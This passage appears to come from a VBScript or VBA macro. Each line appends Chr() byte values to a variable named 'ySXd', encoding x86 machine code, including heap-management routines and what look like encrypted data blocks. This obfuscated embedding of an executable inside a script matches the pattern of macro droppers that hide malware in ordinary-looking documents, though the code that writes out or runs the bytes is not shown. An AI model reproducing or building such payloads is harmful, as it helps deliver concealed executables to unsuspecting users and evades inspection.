ySXd=ySXd&Chr(214)&Chr(139)&Chr(135)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(141)&Chr(95)&Chr(80)&Chr(199)&Chr(69)&Chr(8)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(123)&Chr(248)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(9)&Chr(139)&Chr(3)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(123)&Chr(252)&Chr(0)&Chr(116)&Chr(10)&Chr(139)&Chr(67)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(195)&Chr(16)&Chr(255)&Chr(77)&Chr(8)&Chr(117)&Chr(214)&Chr(139)&Chr(135)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(214)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(139)&Chr(125)&Chr(8)&Chr(133)&Chr(255)&Chr(15)&Chr(132)&Chr(131)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(83)&Chr(86)&Chr(139)&Chr(53)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(135)&Chr(192)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(141)&Chr(95)&Chr(80)&Chr(199)&Chr(69)&Chr(8)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(123)&Chr(248)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(9)&Chr(139)&Chr(3)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(123)&Chr(252)&Chr(0)&Chr(116)&Chr(10)&Chr(139)
ySXd=ySXd&Chr(67)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(80)&Chr(255)&Chr(214)&Chr(131)&Chr(195)&Chr(16)&Chr(255)&Chr(77)&Chr(8)&Chr(117)&Chr(214)&Chr(139)&Chr(135)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(214)&Chr(94)&Chr(91)&Chr(139)&Chr(199)&Chr(95)&Chr(93)&Chr(195)&Chr(133)&Chr(255)&Chr(116)&Chr(55)&Chr(133)&Chr(192)&Chr(116)&Chr(51)&Chr(86)&Chr(139)&Chr(48)&Chr(59)&Chr(247)&Chr(116)&Chr(40)&Chr(87)&Chr(137)&Chr(56)&Chr(232)&Chr(193)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(246)&Chr(116)&Chr(27)&Chr(86)&Chr(232)&Chr(69)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(62)&Chr(0)&Chr(89)&Chr(117)&Chr(15)&Chr(129)&Chr(254)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(89)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(199)&Chr(94)&Chr(195)&Chr(51)&Chr(192)&Chr(195)
ySXd=ySXd&Chr(106)&Chr(12)&Chr(104)&Chr(168)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(8)&Chr(225)&Chr(255)&Chr(255)&Chr(232)&Chr(252)&Chr(221)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(161)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(70)&Chr(112)&Chr(116)&Chr(34)&Chr(131)&Chr(126)&Chr(108)&Chr(0)&Chr(116)&Chr(28)&Chr(232)&Chr(229)&Chr(221)&Chr(255)&Chr(255)&Chr(139)&Chr(112)&Chr(108)&Chr(133)&Chr(246)&Chr(117)&Chr(8)&Chr(106)&Chr(32)&Chr(232)&Chr(90)&Chr(205)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(232)&Chr(27)&Chr(225)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(12)&Chr(232)&Chr(30)&Chr(229)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(141)&Chr(70)&Chr(108)&Chr(139)&Chr(61)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(232)&Chr(105)&Chr(255)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)
ySXd=ySXd&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(193)&Chr(106)&Chr(12)&Chr(232)&Chr(25)&Chr(228)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(117)&Chr(228)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(13)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(161)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(107)&Chr(201)&Chr(20)&Chr(3)&Chr(200)&Chr(235)&Chr(17)&Chr(139)&Chr(85)&Chr(8)&Chr(43)&Chr(80)&Chr(12)&Chr(129)&Chr(250)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(114)&Chr(9)&Chr(131)&Chr(192)&Chr(20)&Chr(59)&Chr(193)&Chr(114)&Chr(235)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(65)&Chr(16)&Chr(86)&Chr(139)&Chr(117)&Chr(12)&Chr(87)&Chr(139)&Chr(254)&Chr(43)&Chr(121)&Chr(12)&Chr(131)&Chr(198)&Chr(252)&Chr(193)&Chr(239)&Chr(15)&Chr(139)&Chr(207)&Chr(105)&Chr(201)
ySXd=ySXd&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(140)&Chr(1)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(77)&Chr(240)&Chr(139)&Chr(14)&Chr(73)&Chr(137)&Chr(77)&Chr(252)&Chr(246)&Chr(193)&Chr(1)&Chr(15)&Chr(133)&Chr(211)&Chr(2)&Chr(0)&Chr(0)&Chr(83)&Chr(141)&Chr(28)&Chr(49)&Chr(139)&Chr(19)&Chr(137)&Chr(85)&Chr(244)&Chr(139)&Chr(86)&Chr(252)&Chr(137)&Chr(85)&Chr(248)&Chr(139)&Chr(85)&Chr(244)&Chr(137)&Chr(93)&Chr(12)&Chr(246)&Chr(194)&Chr(1)&Chr(117)&Chr(116)&Chr(193)&Chr(250)&Chr(4)&Chr(74)&Chr(131)&Chr(250)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(90)&Chr(139)&Chr(75)&Chr(4)&Chr(59)&Chr(75)&Chr(8)&Chr(117)&Chr(66)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(131)&Chr(250)&Chr(32)&Chr(115)&Chr(25)&Chr(139)&Chr(202)&Chr(211)&Chr(235)&Chr(141)&Chr(76)&Chr(2)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(92)&Chr(184)&Chr(68)&Chr(254)
ySXd=ySXd&Chr(9)&Chr(117)&Chr(35)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(25)&Chr(235)&Chr(28)&Chr(141)&Chr(74)&Chr(224)&Chr(211)&Chr(235)&Chr(141)&Chr(76)&Chr(2)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(156)&Chr(184)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(9)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(89)&Chr(4)&Chr(139)&Chr(93)&Chr(12)&Chr(139)&Chr(83)&Chr(8)&Chr(139)&Chr(91)&Chr(4)&Chr(139)&Chr(77)&Chr(252)&Chr(3)&Chr(77)&Chr(244)&Chr(137)&Chr(90)&Chr(4)&Chr(139)&Chr(85)&Chr(12)&Chr(139)&Chr(90)&Chr(4)&Chr(139)&Chr(82)&Chr(8)&Chr(137)&Chr(83)&Chr(8)&Chr(137)&Chr(77)&Chr(252)&Chr(139)&Chr(209)&Chr(193)&Chr(250)&Chr(4)&Chr(74)&Chr(131)&Chr(250)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(90)&Chr(139)&Chr(93)&Chr(248)&Chr(131)&Chr(227)&Chr(1)&Chr(137)&Chr(93)&Chr(244)&Chr(15)&Chr(133)&Chr(143)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(43)&Chr(117)&Chr(248)&Chr(139)&Chr(93)&Chr(248)&Chr(193)&Chr(251)&Chr(4)&Chr(106)&Chr(63)&Chr(137)&Chr(117)&Chr(12)&Chr(75)&Chr(94)&Chr(59)&Chr(222)&Chr(118)&Chr(2)&Chr(139)&Chr(222)&Chr(3)&Chr(77)&Chr(248)&Chr(139)&Chr(209)&Chr(193)&Chr(250)&Chr(4)&Chr(74)&Chr(137)&Chr(77)&Chr(252)&Chr(59)&Chr(214)&Chr(118)&Chr(2)&Chr(139)&Chr(214)&Chr(59)&Chr(218)&Chr(116)&Chr(94)&Chr(139)&Chr(77)&Chr(12)&Chr(139)&Chr(113)&Chr(4)&Chr(59)&Chr(113)&Chr(8)&Chr(117)&Chr(59)&Chr(190)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(251)&Chr(32)&Chr(115)&Chr(23)&Chr(139)&Chr(203)&Chr(211)&Chr(238)&Chr(247)&Chr(214)&Chr(33)&Chr(116)&Chr(184)&Chr(68)&Chr(254)&Chr(76)&Chr(3)&Chr(4)&Chr(117)&Chr(33)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(49)&Chr(235)&Chr(26)&Chr(141)&Chr(75)&Chr(224)&Chr(211)&Chr(238)&Chr(247)&Chr(214)&Chr(33)&Chr(180)&Chr(184)&Chr(196)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(254)&Chr(76)&Chr(3)&Chr(4)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(113)&Chr(4)&Chr(139)&Chr(77)&Chr(12)&Chr(139)&Chr(113)&Chr(8)&Chr(139)&Chr(73)&Chr(4)&Chr(137)&Chr(78)&Chr(4)&Chr(139)&Chr(77)&Chr(12)&Chr(139)&Chr(113)&Chr(4)&Chr(139)&Chr(73)&Chr(8)&Chr(137)&Chr(78)&Chr(8)&Chr(139)&Chr(117)&Chr(12)&Chr(235)&Chr(3)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(125)&Chr(244)&Chr(0)&Chr(117)&Chr(8)&Chr(59)&Chr(218)&Chr(15)&Chr(132)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(240)&Chr(141)&Chr(12)&Chr(209)&Chr(139)&Chr(89)&Chr(4)&Chr(137)&Chr(78)&Chr(8)&Chr(137)&Chr(94)&Chr(4)&Chr(137)&Chr(113)&Chr(4)&Chr(139)&Chr(78)&Chr(4)&Chr(137)&Chr(113)&Chr(8)&Chr(139)&Chr(78)&Chr(4)&Chr(59)&Chr(78)&Chr(8)&Chr(117)&Chr(96)&Chr(138)&Chr(76)&Chr(2)&Chr(4)&Chr(136)&Chr(77)&Chr(15)&Chr(254)
ySXd=ySXd&Chr(193)&Chr(136)&Chr(76)&Chr(2)&Chr(4)&Chr(131)&Chr(250)&Chr(32)&Chr(115)&Chr(37)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(14)&Chr(139)&Chr(202)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(25)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(139)&Chr(202)&Chr(211)&Chr(235)&Chr(141)&Chr(68)&Chr(184)&Chr(68)&Chr(9)&Chr(24)&Chr(235)&Chr(41)&Chr(128)&Chr(125)&Chr(15)&Chr(0)&Chr(117)&Chr(16)&Chr(141)&Chr(74)&Chr(224)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(89)&Chr(4)&Chr(141)&Chr(74)&Chr(224)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(141)&Chr(132)&Chr(184)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(16)&Chr(139)&Chr(69)&Chr(181)&Chr(137)&Chr(6)&Chr(137)&Chr(68)&Chr(48)&Chr(252)&Chr(139)&Chr(69)&Chr(240)
ySXd=ySXd&Chr(255)&Chr(8)&Chr(15)&Chr(133)&Chr(243)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(216)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(53)&Chr(112)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(0)&Chr(64)&Chr(0)&Chr(0)&Chr(193)&Chr(225)&Chr(15)&Chr(3)&Chr(72)&Chr(12)&Chr(187)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(83)&Chr(81)&Chr(255)&Chr(214)&Chr(139)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(9)&Chr(80)&Chr(8)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(64)&Chr(16)&Chr(139)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(164)&Chr(136)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)
ySXd=ySXd&Chr(0)&Chr(139)&Chr(64)&Chr(16)&Chr(254)&Chr(72)&Chr(67)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(72)&Chr(16)&Chr(128)&Chr(121)&Chr(67)&Chr(0)&Chr(117)&Chr(9)&Chr(131)&Chr(96)&Chr(4)&Chr(254)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(120)&Chr(8)&Chr(255)&Chr(117)&Chr(101)&Chr(83)&Chr(106)&Chr(0)&Chr(255)&Chr(112)&Chr(12)&Chr(255)&Chr(214)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(112)&Chr(16)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(116)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(13)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(161)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(107)&Chr(201)&Chr(20)&Chr(139)&Chr(21)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(43)&Chr(200)&Chr(141)&Chr(76)&Chr(17)&Chr(236)&Chr(81)&Chr(141)&Chr(72)&Chr(20)&Chr(81)&Chr(80)&Chr(232)&Chr(117)
ySXd=ySXd&Chr(27)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(131)&Chr(196)&Chr(12)&Chr(255)&Chr(13)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(59)&Chr(5)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(118)&Chr(4)&Chr(131)&Chr(109)&Chr(8)&Chr(20)&Chr(161)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(163)&Chr(188)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(137)&Chr(61)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(91)&Chr(95)&Chr(94)&Chr(201)&Chr(195)&Chr(161)&Chr(192)&Chr(182)&Chr(64)&Chr(0)&Chr(86)&Chr(139)&Chr(53)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(255)&Chr(59)&Chr(240)&Chr(117)&Chr(52)&Chr(131)&Chr(192)&Chr(16)&Chr(107)&Chr(192)&Chr(20)&Chr(80)&Chr(255)&Chr(53)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(192)&Chr(128)&Chr(64)
ySXd=ySXd&Chr(0)&Chr(59)&Chr(199)&Chr(117)&Chr(4)&Chr(51)&Chr(192)&Chr(235)&Chr(120)&Chr(131)&Chr(5)&Chr(192)&Chr(182)&Chr(64)&Chr(0)&Chr(16)&Chr(139)&Chr(53)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(163)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(107)&Chr(246)&Chr(20)&Chr(3)&Chr(53)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(104)&Chr(196)&Chr(65)&Chr(0)&Chr(0)&Chr(106)&Chr(8)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(70)&Chr(16)&Chr(59)&Chr(199)&Chr(116)&Chr(199)&Chr(106)&Chr(4)&Chr(104)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(104)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(87)&Chr(255)&Chr(21)&Chr(188)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(70)&Chr(12)&Chr(59)&Chr(199)&Chr(117)&Chr(18)&Chr(255)&Chr(118)&Chr(16)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)
ySXd=ySXd&Chr(116)&Chr(128)&Chr(64)&Chr(0)&Chr(235)&Chr(155)&Chr(131)&Chr(78)&Chr(8)&Chr(255)&Chr(137)&Chr(62)&Chr(137)&Chr(126)&Chr(4)&Chr(255)&Chr(5)&Chr(176)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(70)&Chr(16)&Chr(131)&Chr(8)&Chr(255)&Chr(139)&Chr(198)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(65)&Chr(8)&Chr(83)&Chr(86)&Chr(139)&Chr(113)&Chr(16)&Chr(87)&Chr(51)&Chr(219)&Chr(235)&Chr(3)&Chr(3)&Chr(192)&Chr(67)&Chr(133)&Chr(192)&Chr(125)&Chr(249)&Chr(139)&Chr(195)&Chr(105)&Chr(192)&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(132)&Chr(48)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(63)&Chr(137)&Chr(69)&Chr(248)&Chr(90)&Chr(137)&Chr(64)&Chr(8)&Chr(137)&Chr(64)&Chr(4)&Chr(131)&Chr(192)&Chr(8)&Chr(74)&Chr(117)&Chr(244)&Chr(106)&Chr(4)&Chr(139)&Chr(251)&Chr(104)
ySXd=ySXd&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(193)&Chr(231)&Chr(15)&Chr(3)&Chr(121)&Chr(12)&Chr(104)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(87)&Chr(255)&Chr(21)&Chr(188)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(184)&Chr(185)&Chr(59)&Chr(192)&Chr(249)&Chr(115)&Chr(117)&Chr(4)&Chr(144)&Chr(123)&Chr(64)&Chr(176)&Chr(182)&Chr(178)&Chr(186)&Chr(140)&Chr(225)&Chr(52)&Chr(137)&Chr(227)&Chr(126)&Chr(61)&Chr(57)&Chr(245)&Chr(124)&Chr(36)&Chr(8)&Chr(246)&Chr(213)&Chr(187)&Chr(5)&Chr(180)&Chr(179)&Chr(114)&Chr(75)&Chr(44)&Chr(112)&Chr(63)&Chr(152)&Chr(73)&Chr(48)&Chr(235)&Chr(74)&Chr(168)&Chr(29)&Chr(141)&Chr(65)&Chr(124)&Chr(115)&Chr(112)&Chr(103)&Chr(65)&Chr(58)&Chr(245)&Chr(0)&Chr(193)&Chr(227)&Chr(116)&Chr(121)&Chr(120)&Chr(125)&Chr(39)&Chr(117)&Chr(10)&Chr(225)&Chr(60)&Chr(44)&Chr(181)&Chr(61)&Chr(131)&Chr(226)&Chr(113)&Chr(16)&Chr(235)&Chr(29)
ySXd=ySXd&Chr(169)&Chr(177)&Chr(127)&Chr(47)&Chr(129)&Chr(249)&Chr(52)&Chr(28)&Chr(12)&Chr(75)&Chr(37)&Chr(119)&Chr(126)&Chr(67)&Chr(132)&Chr(252)&Chr(180)&Chr(118)&Chr(102)&Chr(144)&Chr(114)&Chr(63)&Chr(53)&Chr(5)&Chr(21)&Chr(4)&Chr(20)&Chr(122)&Chr(42)&Chr(253)&Chr(74)&Chr(134)&Chr(224)&Chr(123)&Chr(73)&Chr(145)&Chr(124)&Chr(45)&Chr(176)&Chr(187)&Chr(126)&Chr(17)&Chr(235)&Chr(72)&Chr(184)&Chr(123)&Chr(36)&Chr(125)&Chr(11)&Chr(209)&Chr(208)&Chr(224)&Chr(19)&Chr(213)&Chr(159)&Chr(185)&Chr(128)&Chr(225)&Chr(2)&Chr(227)&Chr(64)&Chr(179)&Chr(153)&Chr(119)&Chr(13)&Chr(147)&Chr(183)&Chr(168)&Chr(127)&Chr(34)&Chr(226)&Chr(56)&Chr(212)&Chr(186)&Chr(133)&Chr(214)&Chr(112)&Chr(55)&Chr(178)&Chr(182)&Chr(113)&Chr(49)&Chr(248)&Chr(155)&Chr(117)&Chr(66)&Chr(152)&Chr(146)&Chr(179)&Chr(177)&Chr(145)&Chr(118)&Chr(29)&Chr(73)&Chr(116)&Chr(60)&Chr(39)&Chr(252)&Chr(114)&Chr(53)
ySXd=ySXd&Chr(183)&Chr(102)&Chr(180)&Chr(176)&Chr(121)&Chr(45)&Chr(146)&Chr(122)&Chr(13)&Chr(5)&Chr(64)&Chr(141)&Chr(66)&Chr(147)&Chr(248)&Chr(115)&Chr(20)&Chr(52)&Chr(159)&Chr(182)&Chr(249)&Chr(47)&Chr(61)&Chr(213)&Chr(63)&Chr(120)&Chr(21)&Chr(4)&Chr(155)&Chr(186)&Chr(187)&Chr(44)&Chr(74)&Chr(12)&Chr(37)&Chr(153)&Chr(67)&Chr(144)&Chr(168)&Chr(185)&Chr(253)&Chr(65)&Chr(178)&Chr(55)&Chr(214)&Chr(169)&Chr(36)&Chr(72)&Chr(103)&Chr(184)&Chr(28)&Chr(26)&Chr(245)&Chr(181)&Chr(212)&Chr(152)&Chr(75)&Chr(233)&Chr(20)&Chr(198)&Chr(255)&Chr(255)&Chr(31)&Chr(137)&Chr(77)&Chr(16)&Chr(137)&Chr(93)&Chr(252)&Chr(15)&Chr(142)&Chr(85)&Chr(1)&Chr(0)&Chr(0)&Chr(246)&Chr(195)&Chr(1)&Chr(15)&Chr(133)&Chr(69)&Chr(1)&Chr(0)&Chr(0)&Chr(3)&Chr(217)&Chr(59)&Chr(243)&Chr(15)&Chr(143)&Chr(59)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(252)&Chr(193)&Chr(249)&Chr(4)
ySXd=ySXd&Chr(73)&Chr(137)&Chr(77)&Chr(248)&Chr(131)&Chr(249)&Chr(63)&Chr(118)&Chr(6)&Chr(106)&Chr(63)&Chr(89)&Chr(137)&Chr(77)&Chr(248)&Chr(139)&Chr(95)&Chr(4)&Chr(59)&Chr(95)&Chr(8)&Chr(117)&Chr(67)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(131)&Chr(249)&Chr(192)&Chr(115)&Chr(26)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(248)&Chr(141)&Chr(76)&Chr(1)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(92)&Chr(144)&Chr(68)&Chr(254)&Chr(9)&Chr(117)&Chr(38)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(25)&Chr(235)&Chr(31)&Chr(131)&Chr(193)&Chr(224)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(248)&Chr(141)&Chr(76)&Chr(1)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(156)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(9)&Chr(117)&Chr(6)&Chr(139)&Chr(77)&Chr(8)&Chr(33)&Chr(89)&Chr(4)&Chr(139)&Chr(79)&Chr(8)&Chr(139)&Chr(95)&Chr(4)&Chr(137)&Chr(89)&Chr(4)&Chr(139)
ySXd=ySXd&Chr(79)&Chr(4)&Chr(139)&Chr(127)&Chr(8)&Chr(137)&Chr(121)&Chr(8)&Chr(139)&Chr(77)&Chr(16)&Chr(43)&Chr(206)&Chr(1)&Chr(77)&Chr(252)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(15)&Chr(142)&Chr(165)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(125)&Chr(252)&Chr(139)&Chr(77)&Chr(12)&Chr(193)&Chr(255)&Chr(4)&Chr(79)&Chr(141)&Chr(76)&Chr(49)&Chr(252)&Chr(131)&Chr(255)&Chr(63)&Chr(118)&Chr(3)&Chr(106)&Chr(63)&Chr(95)&Chr(139)&Chr(93)&Chr(244)&Chr(141)&Chr(28)&Chr(251)&Chr(137)&Chr(93)&Chr(16)&Chr(139)&Chr(91)&Chr(4)&Chr(137)&Chr(89)&Chr(4)&Chr(139)&Chr(93)&Chr(16)&Chr(137)&Chr(89)&Chr(8)&Chr(137)&Chr(75)&Chr(4)&Chr(139)&Chr(89)&Chr(4)&Chr(137)&Chr(75)&Chr(8)&Chr(139)&Chr(89)&Chr(4)&Chr(59)&Chr(89)&Chr(8)&Chr(117)&Chr(87)&Chr(138)&Chr(76)&Chr(7)&Chr(4)&Chr(136)&Chr(77)&Chr(19)&Chr(254)&Chr(193)&Chr(136)&Chr(76)&Chr(7)&Chr(4)&Chr(131)
ySXd=ySXd&Chr(255)&Chr(32)&Chr(115)&Chr(28)&Chr(128)&Chr(125)&Chr(19)&Chr(0)&Chr(117)&Chr(14)&Chr(139)&Chr(207)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(25)&Chr(141)&Chr(68)&Chr(144)&Chr(68)&Chr(139)&Chr(207)&Chr(235)&Chr(32)&Chr(128)&Chr(125)&Chr(19)&Chr(0)&Chr(117)&Chr(16)&Chr(141)&Chr(79)&Chr(224)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(8)&Chr(9)&Chr(89)&Chr(4)&Chr(141)&Chr(132)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(79)&Chr(224)&Chr(186)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(234)&Chr(9)&Chr(16)&Chr(139)&Chr(85)&Chr(12)&Chr(139)&Chr(77)&Chr(252)&Chr(141)&Chr(68)&Chr(50)&Chr(252)&Chr(137)&Chr(8)&Chr(137)&Chr(76)&Chr(1)&Chr(252)&Chr(235)&Chr(3)&Chr(139)&Chr(85)&Chr(12)&Chr(141)&Chr(70)&Chr(1)&Chr(137)&Chr(66)&Chr(252)
